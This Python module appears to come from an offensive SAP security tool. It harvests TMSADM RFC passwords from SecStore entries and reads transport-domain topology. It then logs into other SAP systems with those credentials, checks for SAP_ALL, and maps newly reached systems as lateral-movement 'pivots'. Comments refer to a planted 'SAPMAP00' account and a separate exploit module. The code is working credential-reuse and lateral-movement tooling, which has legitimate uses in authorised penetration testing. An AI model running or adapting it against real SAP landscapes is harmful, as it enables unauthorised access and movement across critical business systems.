"""CTS / TMS discovery + credential-verification primitive.

Bundle 1 of the CTS/TMS epic.  Sister module to sap_dbcon_probe.py —
does for TMSADM RFC destinations what dbcon does for external-DB
credentials: pairs RSECTAB entries with SM59 topology, materialises
domain members on the map, verifies logins.

What lives here (READ-ONLY primitives):
  read_tms_config(node, creds)
        RFC_READ_TABLE TMSCSYS + TMSMCONF → returns
        {domain, controller, members: [{sid, host, ...}, ...]}
        Uses the same USE_ET_DATA_4_RETURN + ABAP-SELECT fallback
        pattern proven on DBCON — modern S/4 protected-tables
        filter also blocks these views on some kernels.

  integrate_tms_from_secstore(node, state, creds)
        Walks node.secstore_entries for /RFC/TMSADM@<SID>.DOMAIN_<X>
        idents, pairs with read_tms_config output, appends
        TMSDestination rows to node.tms_destinations.  Idempotent
        (preserves probe verdicts on re-run — same shape as DBCON).

  probe_tms_destination(dest, state=None)
        Test TMSADM RFC logon to `dest`.  On success, fetches
        TMSADM's profile assignments via BAPI_USER_GET_DETAIL and
        recognises SAP_ALL.  On is_controller + logon_ok, materialises
        the target as a first-class SAPNode (mirrors DBCON's
        materialize_target_as_sap_node).

  read_tms_buffer(dest)
        TMSBUFFER on target — "what's pending import here".  Bundle 1
        surface for the operator.

  read_recent_transports(dest, days=30)
        E070 + E071 — recently released / imported transports on
        target.  Read-only intelligence.

Bundle 2 (write primitives) will live in a separate sap_tms_exploit.py
so this file stays a pure read-only reconnaissance surface.
"""
from __future__ import annotations

import re as _re
from datetime import datetime, timezone
from typing import Optional

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, TMSDestination,
)


# ============================================================================
# TMS topology read via RFC_READ_TABLE (+ ABAP fallback)
# ============================================================================

def _hana_error_code(exc):
    """Reuse DBCON's error-code parser."""
    try:
        from sap_dbcon_probe import _hana_error_code as _p
        return _p(exc)
    except Exception:
        return None


def _pick_rows(res: dict):
    """Same wide/narrow bucket resolution DBCON needs — TMSCSYS rows
    can exceed the classic DATA(TAB512) limit on modern kernels."""
    wide = (res.get("ET_DATA") or res.get("ET_DATA_4_RETURN") or [])
    narrow = res.get("DATA") or []
    return (wide if wide else narrow, len(narrow), len(wide))


def _parse_wa_row(r, keys: list):
    """Parse a delimited or shape-B row into a dict.  keys = column
    order for delimited-mode parsing."""
    if not isinstance(r, dict):
        return None
    wa = r.get("WA") or r.get("ZEILE") or r.get("LINE") or ""
    if wa:
        parts = [p.strip() for p in wa.split("|")]
        if len(parts) >= len(keys):
            return dict(zip(keys, parts[:len(keys)]))
    # Shape B — structured row keyed by DDIC field name (case-varying)
    out = {}
    for k in keys:
        v = (r.get(k) or r.get(k.lower()) or "").strip() if isinstance(
            r.get(k) or r.get(k.lower()), str) else (
                r.get(k) or r.get(k.lower()))
        if v is None:
            v = ""
        out[k] = str(v).strip() if not isinstance(v, str) else v.strip()
    return out if out.get(keys[0]) else None


def _is_table_without_data(exc) -> bool:
    """SAP raises ABAPApplicationError AD 718 / TABLE_WITHOUT_DATA
    when RFC_READ_TABLE finds no matching rows.  This is a
    LEGITIMATE empty result, not a failure — e.g. TMSBUFFER on a
    single-system landscape has zero pending imports.  Callers
    should treat this as success-with-zero-rows.
    """
    s = str(exc)
    return ("TABLE_WITHOUT_DATA" in s
            or ("AD" in s and "718" in s and "Number:718" in s))


def _rfc_read_table(conn, table: str, fields: list, rowcount: int = 500):
    """Wrap RFC_READ_TABLE with the ET_DATA / narrow bucket handling
    proven on DBCON.  Returns (rows_raw, used_flag, error_or_None)."""
    from sapmap_config import RFC_READ_TABLE
    field_list = [{"FIELDNAME": f} for f in fields]
    try:
        try:
            res = conn.call(RFC_READ_TABLE,
                             QUERY_TABLE=table,
                             DELIMITER="|",
                             FIELDS=field_list,
                             ROWCOUNT=rowcount,
                             USE_ET_DATA_4_RETURN="X")
            used_flag = True
        except Exception:
            res = conn.call(RFC_READ_TABLE,
                             QUERY_TABLE=table,
                             DELIMITER="|",
                             FIELDS=field_list,
                             ROWCOUNT=rowcount)
            used_flag = False
        raw, _n, _w = _pick_rows(res)
        return raw, used_flag, None
    except Exception as e:
        return [], False, e


def read_tms_config(node: SAPNode, creds: Credentials = None) -> dict:
    """Read TMSCSYS + TMSMCONF to enumerate the transport domain
    this system belongs to.

    Returns {domain, controller, members: [{sid, host, ...}, ...],
    error}.
    """
    out = {"domain": "", "controller": "", "members": [], "error": ""}
    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    try:
        with _get_connection(node, creds) as conn:
            # TMSMCONF — master configuration.  Keyed by
            # DOMAIN + SYSNAM; the row where SYSNAM == DOMAINCTL
            # identifies the domain controller.  Columns vary by
            # release; ask for the ones present in every S/4:
            #   DOMAIN, DOMAINCTL
            mc_rows, mc_flag, mc_err = _rfc_read_table(
                conn, "TMSMCONF",
                ["DOMAIN", "DOMAINCTL"], rowcount=50)
            if mc_err:
                print(f"[-] {node.sid}: read_tms_config: TMSMCONF "
                      f"read failed — "
                      f"{format_rfc_exception(mc_err)}")
            print(f"[*] {node.sid}: read_tms_config: TMSMCONF "
                  f"returned {len(mc_rows)} row(s) "
                  f"(flag={mc_flag})")
            for r in mc_rows:
                parsed = _parse_wa_row(r, ["DOMAIN", "DOMAINCTL"])
                if not parsed:
                    continue
                if not out["domain"]:
                    out["domain"] = parsed.get("DOMAIN", "")
                    out["controller"] = parsed.get("DOMAINCTL", "")

            # TMSCSYS — every system in the transport domain
            # Columns: SYSNAM (SID), SYSTXT, SYSTYP, HOSTNAME
            cs_rows, cs_flag, cs_err = _rfc_read_table(
                conn, "TMSCSYS",
                ["SYSNAM", "SYSTXT", "SYSTYP", "HOSTNAME"],
                rowcount=200)
            if cs_err:
                out["error"] = (f"TMSCSYS read failed — "
                                 f"{format_rfc_exception(cs_err)}")
                print(f"[-] {node.sid}: read_tms_config: {out['error']}")
                return out
            print(f"[*] {node.sid}: read_tms_config: TMSCSYS "
                  f"returned {len(cs_rows)} row(s) "
                  f"(flag={cs_flag})")
            for r in cs_rows:
                parsed = _parse_wa_row(
                    r, ["SYSNAM", "SYSTXT", "SYSTYP", "HOSTNAME"])
                if not parsed or not parsed.get("SYSNAM"):
                    continue
                out["members"].append({
                    "sid":  parsed["SYSNAM"].strip(),
                    "text": parsed.get("SYSTXT", "").strip(),
                    "type": parsed.get("SYSTYP", "").strip(),
                    "host": parsed.get("HOSTNAME", "").strip(),
                })
    except Exception as e:
        out["error"] = f"connection failed: {type(e).__name__}: {e}"
        print(f"[-] {node.sid}: read_tms_config: {out['error']}")

    if out["controller"]:
        print(f"[+] {node.sid}: TMS domain {out['domain']!r} — "
              f"controller {out['controller']!r}, "
              f"{len(out['members'])} member(s)")
    return out


# ============================================================================
# SecStore /RFC/TMSADM@... pair with TMS topology
# ============================================================================

# TMSADM RFC destinations conventionally match:
#   TMSADM@<SID>.DOMAIN_<DOMAIN>
# The SecStore ident_clean is /RFC/<that name> after MANDT stripping.
_TMSADM_IDENT_RE = _re.compile(
    # SAP TMS naming: TMSADM@<SID>.<full-domain-name>.
    # <full-domain-name> typically starts with "DOMAIN_" but keep
    # the whole string as the domain identifier (matches what
    # TMSMCONF.DOMAIN returns — the caller doesn't have to strip
    # a prefix that our probe would then re-apply).
    r"^/RFC/TMSADM@(?P<sid>[A-Z0-9]+)\.(?P<domain>[A-Z0-9_]+)$",
    _re.IGNORECASE)


def integrate_tms_from_secstore(node: SAPNode, state: SAPMAPState,
                                  creds: Credentials = None) -> list:
    """Pair every /RFC/TMSADM@<sid>.DOMAIN_<x> SecStore entry with a
    TMSCSYS row of the same SYSNAM.  Appends TMSDestination rows
    to node.tms_destinations.  Idempotent — reruns match by
    (target_sid, domain) and overwrite the previous entry
    (preserves probe verdicts).

    Returns the list of newly-added or updated destinations.
    """
    # Find every RFC-category SecStore entry with a TMSADM ident
    rfc_entries = []
    for e in (node.secstore_entries or []):
        if not isinstance(e, dict):
            continue
        if e.get("category") != "rfc":
            continue
        if not e.get("password"):
            continue
        ident = e.get("ident_clean") or e.get("ident") or ""
        m = _TMSADM_IDENT_RE.match(ident)
        if m:
            rfc_entries.append((e, m.group("sid").upper(),
                                 m.group("domain").upper()))
    if not rfc_entries:
        return []

    # Read TMS topology once
    tms_cfg = read_tms_config(node, creds)
    members_by_sid = {m["sid"].upper(): m
                      for m in tms_cfg.get("members", []) or []}
    controller_sid = (tms_cfg.get("controller") or "").upper()
    tms_domain = (tms_cfg.get("domain") or "").upper()

    existing_by_key = {(d.target_sid.upper(), d.domain.upper()): d
                        for d in (node.tms_destinations or [])}
    added = []

    for entry, tgt_sid, tgt_domain in rfc_entries:
        row = members_by_sid.get(tgt_sid)
        host = (row or {}).get("host", "")
        is_ctrl = (tgt_sid == controller_sid) if controller_sid else False
        key = (tgt_sid, tgt_domain)
        prev = existing_by_key.get(key)
        dest = TMSDestination(
            source_sid=node.sid,
            target_sid=tgt_sid,
            target_host=host,
            target_client="000",
            domain=tgt_domain,
            is_controller=is_ctrl,
            password=entry["password"],
        )
        if prev is not None:
            # Preserve probe verdicts on re-run
            dest.tested            = prev.tested
            dest.logon_ok          = prev.logon_ok
            dest.tmsadm_roles      = prev.tmsadm_roles
            dest.tmsadm_has_sap_all = prev.tmsadm_has_sap_all
            dest.buffer_count      = prev.buffer_count
            dest.recent_transports = prev.recent_transports
            dest.pwned             = prev.pwned
            dest.tested_at         = prev.tested_at
        existing_by_key[key] = dest
        added.append(dest)

    node.tms_destinations = list(existing_by_key.values())

    # Tag the source node with its own domain for later map rendering
    if tms_domain and not node.tms_domain:
        node.tms_domain = tms_domain
        node.is_tms_controller = (
            node.sid.upper() == controller_sid) if controller_sid else False

    if added:
        try:
            from sapmap_findings import emit_finding
            for d in added:
                ctrl = " (DOMAIN CONTROLLER)" if d.is_controller else ""
                emit_finding(
                    "INFO", node.sid,
                    f"CTS/TMS pair: TMSADM@{d.target_sid}.DOMAIN_"
                    f"{d.domain} resolved — "
                    f"{d.target_host or '?host'}{ctrl}",
                    ref="tms.resolved",
                    meta={"target_sid": d.target_sid,
                          "domain": d.domain,
                          "is_controller": d.is_controller},
                    attack_capability="recon.tms_domain")
        except Exception:
            pass
    return added


# ============================================================================
# TMSADM RFC logon probe
# ============================================================================

def _make_creds(dest: TMSDestination) -> Credentials:
    """Build the Credentials object we hand to sapmap_rfc._get_connection
    when opening a live logon as TMSADM against `dest`."""
    return Credentials(
        username="TMSADM",
        password=dest.password,
        client=dest.target_client or "000",
        verified=False,
    )


def _resolve_missing_host(dest: TMSDestination,
                            state: SAPMAPState = None) -> str:
    """When dest.target_host is empty (TMSCSYS read during discovery
    returned nothing — often because SAPMAP had only TMSADM's low-priv
    password at the time), try harder now that Test is being called:

      1. If target_sid == source_sid, use the source node's own host
         (self-referential TMSADM@S4H.DOMAIN_S4H is trivial to resolve)
      2. If state is available and target_sid already exists on the
         map (from an earlier scan), copy its host
      3. Re-run read_tms_config on the SOURCE using its best_credentials
         — SAPMAP00 or another verified ABAP cred usually has TMSCSYS
         read rights that TMSADM doesn't
    """
    if dest.target_host:
        return dest.target_host
    tgt = (dest.target_sid or "").upper().strip()
    if not tgt:
        return ""
    if state is not None:
        source = state.get_node(dest.source_sid)
        # Self-reference: TMSADM@S4H.DOMAIN_S4H on S4H itself
        if source is not None and tgt == source.sid.upper():
            host = source.ip or source.hostname
            if host:
                print(f"[+] {dest.source_sid}: resolve host — self-"
                      f"reference: using source's host {host!r}")
                return host
        # Existing map node for the target
        existing = state.get_node(tgt)
        if existing is not None:
            host = existing.ip or existing.hostname
            if host:
                print(f"[+] {dest.source_sid}: resolve host — "
                      f"target already on map: {host!r}")
                return host
    # Last resort: re-run TMSCSYS read with source's best creds
    if state is not None:
        source = state.get_node(dest.source_sid)
        if source is not None:
            creds = None
            try:
                creds = source.best_credentials()
            except Exception:
                pass
            if creds:
                print(f"[*] {dest.source_sid}: resolve host — re-"
                      f"reading TMSCSYS with {creds.username}")
                cfg = read_tms_config(source, creds)
                for m in (cfg.get("members") or []):
                    if m.get("sid", "").upper() == tgt:
                        host = m.get("host", "")
                        if host:
                            print(f"[+] {dest.source_sid}: resolve host "
                                  f"— TMSCSYS re-read via "
                                  f"{creds.username}: {host!r}")
                            return host
    return ""


def probe_tms_destination(dest: TMSDestination,
                            state: SAPMAPState = None) -> None:
    """Open a live RFC logon to `dest` as TMSADM and inspect the
    account.  Mutates `dest` in-place.

    Success path:
      1. Open the connection (proves the SecStore password is live)
      2. Call BAPI_USER_GET_DETAIL for TMSADM → profile list
      3. Set dest.tmsadm_roles + dest.tmsadm_has_sap_all
      4. If dest.is_controller AND logon_ok, materialise the target
         as a first-class SAPNode on the map so the operator sees it.
    """
    dest.tested = True
    dest.tested_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
    dest.logon_ok = False
    dest.tmsadm_roles = []
    dest.tmsadm_has_sap_all = False
    dest.error = ""

    # Re-resolve host if the discovery read couldn't populate it —
    # TMSADM often can't read TMSCSYS, but the source SAP node has
    # a better credential (SAPMAP00 typically) that can.
    if not dest.target_host:
        dest.target_host = _resolve_missing_host(dest, state)

    if not dest.target_host:
        dest.error = ("no target host — TMSCSYS row for "
                       f"SID={dest.target_sid} was not found "
                       "(tried self-reference, existing map node, "
                       "and re-read via source's best credentials)")
        print(f"[-] {dest.source_sid}: TMS probe → "
              f"{dest.target_sid}: {dest.error}")
        return

    # Build a synthetic SAPNode with the target's host so sapmap_rfc
    # can dispatch the connection.  We ONLY use it for the login —
    # not adding to state.nodes here (materialize step handles that).
    tgt_node = SAPNode(
        sid=dest.target_sid,
        ip=dest.target_host,
        hostname=dest.target_host,
    )
    # Instance number is not part of TMSCSYS output for most releases.
    # Add a default 00 — TMSADM RFC dests conventionally target
    # sysnr 00.  Operators can override via the SAPNode later.
    from sapmap_models import InstanceInfo
    tgt_node.instances = [InstanceInfo(instance_nr="00",
                                          ip=dest.target_host)]

    try:
        from sapmap_rfc import _get_connection, get_user_details
    except Exception as e:
        dest.error = f"sapmap_rfc import failed: {e}"
        return

    creds = _make_creds(dest)
    print(f"[*] {dest.source_sid}: TMS probe → TMSADM@"
          f"{dest.target_sid} at {dest.target_host}:00 (domain "
          f"{dest.domain}"
          + (", DOMAIN CONTROLLER" if dest.is_controller else "")
          + ")")
    try:
        with _get_connection(tgt_node, creds) as _c:
            dest.logon_ok = True
            print(f"[+] {dest.source_sid}: TMSADM logon to "
                  f"{dest.target_sid} succeeded")
    except Exception as e:
        dest.error = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
        print(f"[-] {dest.source_sid}: TMSADM logon to "
              f"{dest.target_sid} failed: {dest.error}")
        return

    # Once logon succeeded — fetch TMSADM's profile assignments.
    try:
        det = get_user_details(tgt_node, "TMSADM", creds)
        dest.tmsadm_roles = list(det.get("profiles", []) or [])
        dest.tmsadm_has_sap_all = bool(det.get("has_sap_all", False))
        print(f"    [+] TMSADM profiles: "
              f"{dest.tmsadm_roles or 'none'} "
              + ("(SAP_ALL)" if dest.tmsadm_has_sap_all else ""))
    except Exception as e:
        print(f"    [*] BAPI_USER_GET_DETAIL raised (non-fatal): "
              f"{type(e).__name__}: {str(e)[:120]}")

    # Materialize the target as a real SAPNode (mirrors the DBCON
    # pattern).  On the domain controller, this is especially
    # important since the operator will want to click into it.
    if state is not None:
        try:
            _materialize_tms_target(dest, state)
        except Exception as _me:
            print(f"    [*] materialize skipped: {_me}")

    # Emit finding
    try:
        from sapmap_findings import emit_finding
        sev = "CRITICAL" if dest.is_controller else "HIGH"
        ctrl = " (DOMAIN CONTROLLER)" if dest.is_controller else ""
        sap_all = " with SAP_ALL" if dest.tmsadm_has_sap_all else ""
        emit_finding(
            sev, dest.source_sid,
            f"CTS/TMS: TMSADM logon to {dest.target_sid} "
            f"({dest.target_host}) succeeded{ctrl}{sap_all} — "
            f"cross-system transport rights available",
            ref="tms.logon.ok",
            meta={"target_sid": dest.target_sid,
                  "is_controller": dest.is_controller,
                  "domain": dest.domain},
            attack_capability="lateral.tmsadm_rfc")
    except Exception:
        pass


def _materialize_tms_target(dest: TMSDestination,
                              state: SAPMAPState) -> Optional[SAPNode]:
    """Same pattern as sap_dbcon_probe.materialize_target_as_sap_node
    but for TMS.  Idempotent — existing nodes get tagged, new nodes
    get created.  Only fires when dest.logon_ok."""
    if not dest.logon_ok:
        return None
    tgt = (dest.target_sid or "").upper().strip()
    if not tgt:
        return None
    existing = state.get_node(tgt)
    if existing is not None:
        changed = False
        if not existing.discovered_via_tms:
            existing.discovered_via_tms = True
            existing.tms_parent_sid = dest.source_sid
            changed = True
        if dest.is_controller and not existing.is_tms_controller:
            existing.is_tms_controller = True
            changed = True
        if dest.domain and not existing.tms_domain:
            existing.tms_domain = dest.domain
            changed = True
        if changed:
            print(f"[*] materialize_tms_target: {tgt} already on map "
                  f"— tagged discovered_via_tms=True"
                  + (" + CTRL" if dest.is_controller else ""))
        return existing
    node = SAPNode(
        sid=tgt,
        ip=dest.target_host,
        hostname=dest.target_host,
        discovered_via_tms=True,
        tms_parent_sid=dest.source_sid,
        is_tms_controller=dest.is_controller,
        tms_domain=dest.domain,
    )
    try:
        state.add_node(node)
        print(f"[+] materialize_tms_target: new SAPNode {tgt} @ "
              f"{dest.target_host} added (via TMS pivot from "
              f"{dest.source_sid})"
              + (" — DOMAIN CONTROLLER" if dest.is_controller else ""))
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "HIGH", dest.source_sid,
                f"CTS/TMS pivot uncovered a new SAP system: {tgt} "
                f"@ {dest.target_host} "
                f"(domain {dest.domain}"
                + (", DOMAIN CONTROLLER" if dest.is_controller else "")
                + ")",
                ref="tms.new_sap_system",
                attack_capability="lateral.tmsadm_rfc")
        except Exception:
            pass
    except Exception as e:
        print(f"[-] materialize_tms_target: add_node failed: "
              f"{type(e).__name__}: {e}")
        return None
    return node


# ============================================================================
# TMSBUFFER + transport history (read-only intel)
# ============================================================================

def _best_read_creds(dest: TMSDestination,
                       state: SAPMAPState = None):
    """Pick the best credential for RFC_READ_TABLE against the DEST's
    target.  TMSADM (dest.password) is only authorised for RFC_PING
    + TMS-specific FMs — RFC_READ_TABLE with it makes the kernel drop
    the conversation (RFC_COMMUNICATION_FAILURE, "no conversation
    found").

    Preference order:
      1. TARGET node's best_credentials (if the target is on the map
         and has a verified cred there — e.g. we planted SAPMAP00
         on it directly)
      2. SOURCE node's best_credentials — works when source==target
         (self-referential TMSADM@S4H.DOMAIN_S4H) and often works
         cross-system too when SAPMAP00 was propagated
      3. Fall back to TMSADM (dest.password) — call will likely
         fail for table reads but caller gets a real error not a
         silent misfire
    """
    if state is not None:
        tgt = state.get_node(dest.target_sid)
        if tgt is not None:
            c = tgt.best_credentials()
            if c and c.username.upper() != "TMSADM":
                return c, "target-node cred"
        src = state.get_node(dest.source_sid)
        if src is not None:
            c = src.best_credentials()
            if c and c.username.upper() != "TMSADM":
                return c, "source-node cred"
    return _make_creds(dest), "TMSADM (fallback, unlikely to work for RFC_READ_TABLE)"


def _target_sapnode(dest: TMSDestination) -> SAPNode:
    """Build a synthetic SAPNode for dispatching an RFC connection
    to the DEST's target host.  Not added to state — this is
    per-call and short-lived."""
    tgt = SAPNode(sid=dest.target_sid,
                    ip=dest.target_host,
                    hostname=dest.target_host)
    from sapmap_models import InstanceInfo
    tgt.instances = [InstanceInfo(instance_nr="00",
                                     ip=dest.target_host)]
    return tgt


def read_tms_buffer(dest: TMSDestination,
                     state: SAPMAPState = None) -> dict:
    """Read TMSBUFFER on the target — pending imports.

    Requires dest.logon_ok.  Uses the best available RFC credential
    for the target — NOT TMSADM (which is only authorised for
    RFC_PING + TMS-specific FMs).  Returns {ok, error, count,
    rows: [{trkorr, tarsystem, mode, ...}]}.  Also caches the count
    on dest.buffer_count.
    """
    out = {"ok": False, "error": "", "count": 0, "rows": []}
    if not dest.logon_ok:
        out["error"] = "TMSADM logon not verified — Test first"
        return out
    tgt = _target_sapnode(dest)

    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    creds, cred_note = _best_read_creds(dest, state)
    print(f"[*] {dest.source_sid}: TMSBUFFER on {dest.target_sid} "
          f"— using {creds.username} ({cred_note})")
    # TMSBUFFER real DDIC columns (verified against SE16 on S/4 2025):
    #   DOMNAM   domain name
    #   SYSNAM   target system (this is the SID being imported INTO)
    #   BUFPOS   position in the import queue
    #   BUFLVL   buffer level (0 = normal queue)
    #   TRKORR   transport request number
    #   UMODES   unconditional-modes (I / 1S / 2 …)
    #   IMPFLG   import status flag (k=to-do / w=waiting / t=in-progress)
    #   MAXRC    highest return code from previous import attempts
    #   TRFUNC   transport type (K=customizing, W=workbench, T=task…)
    # NB: previous field list asked for TARSYSTEM / COUNT / BUFFER /
    # MODE — none of those exist in TMSBUFFER on modern S/4.
    # RFC_READ_TABLE raises AD 718 when fields are unknown and my
    # "table-without-data" handler was swallowing it.  Real columns
    # fix both the empty-result symptom and give the operator the
    # useful data (which system, which transport, what state).
    _BUFFER_FIELDS = ["DOMNAM", "SYSNAM", "BUFPOS", "TRKORR",
                       "UMODES", "IMPFLG", "MAXRC", "TRFUNC"]
    try:
        with _get_connection(tgt, creds) as conn:
            rows_raw, flag, err = _rfc_read_table(
                conn, "TMSBUFFER", _BUFFER_FIELDS, rowcount=200)
            if err:
                if _is_table_without_data(err):
                    out["ok"] = True
                    dest.buffer_count = 0
                    print(f"[+] TMSBUFFER on {dest.target_sid}: "
                          f"0 pending import(s) (TABLE_WITHOUT_DATA)")
                    return out
                out["error"] = (f"TMSBUFFER read failed — "
                                 f"{format_rfc_exception(err)}")
                return out
            for r in rows_raw:
                p = _parse_wa_row(r, _BUFFER_FIELDS)
                if p and p.get("TRKORR"):
                    out["rows"].append(p)
            out["ok"] = True
            out["count"] = len(out["rows"])
            dest.buffer_count = out["count"]
            print(f"[+] TMSBUFFER on {dest.target_sid}: "
                  f"{out['count']} pending import(s)")
    except Exception as e:
        out["error"] = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
    return out


def read_recent_transports(dest: TMSDestination, limit: int = 50,
                              state: SAPMAPState = None) -> dict:
    """Read E070 (transport request headers) on the target.  Uses the
    same best-cred selector as read_tms_buffer — TMSADM can't do
    RFC_READ_TABLE."""
    out = {"ok": False, "error": "", "count": 0, "rows": []}
    if not dest.logon_ok:
        out["error"] = "TMSADM logon not verified — Test first"
        return out
    tgt = _target_sapnode(dest)

    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    creds, cred_note = _best_read_creds(dest, state)
    print(f"[*] {dest.source_sid}: E070 on {dest.target_sid} "
          f"— using {creds.username} ({cred_note})")
    try:
        with _get_connection(tgt, creds) as conn:
            rows_raw, flag, err = _rfc_read_table(
                conn, "E070",
                ["TRKORR", "TRFUNCTION", "TRSTATUS",
                 "AS4USER", "AS4DATE", "AS4TIME"],
                rowcount=int(limit))
            if err:
                if _is_table_without_data(err):
                    out["ok"] = True
                    dest.recent_transports = []
                    print(f"[+] Recent transports on "
                          f"{dest.target_sid}: 0 row(s) "
                          f"(TABLE_WITHOUT_DATA — E070 truly empty)")
                    return out
                out["error"] = (f"E070 read failed — "
                                 f"{format_rfc_exception(err)}")
                return out
            for r in rows_raw:
                p = _parse_wa_row(r, ["TRKORR", "TRFUNCTION",
                                        "TRSTATUS", "AS4USER",
                                        "AS4DATE", "AS4TIME"])
                if p and p.get("TRKORR"):
                    out["rows"].append(p)
            # E070 is unordered; sort by AS4DATE desc so recent first
            out["rows"].sort(
                key=lambda x: (x.get("AS4DATE", ""), x.get("AS4TIME", "")),
                reverse=True)
            out["rows"] = out["rows"][:limit]
            out["ok"] = True
            out["count"] = len(out["rows"])
            dest.recent_transports = list(out["rows"])
            print(f"[+] Recent transports on {dest.target_sid}: "
                  f"{out['count']} row(s) from E070")
    except Exception as e:
        out["error"] = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
    return out
